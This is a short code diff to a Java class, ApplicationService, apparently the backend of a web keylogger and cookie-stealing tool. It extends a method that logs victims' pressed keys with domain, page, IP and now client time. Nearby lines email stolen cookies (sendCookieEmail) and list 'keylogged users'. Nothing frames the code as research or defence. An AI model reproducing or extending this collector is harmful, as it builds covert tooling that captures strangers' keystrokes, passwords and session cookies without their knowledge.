@@ -30,8 +30,8 @@ public class ApplicationService {
 		Smtp.sendCookieEmail(subject, message);
 	}
 
-	public void logPressedKey(String domain, String page, String pressedKey, String clientIP) throws SQLException {
-		applicationDao.logPressedKeys(domain, page, pressedKey, clientIP);
+	public void logPressedKey(String domain, String page, String pressedKey, String clientIP, String clientTime) throws SQLException {
+		applicationDao.logPressedKeys(domain, page, pressedKey, clientIP, clientTime);
 	}
 
 	public List<KeyloggedUser> getKeyloggedUsers(String logDate) throws SQLException {
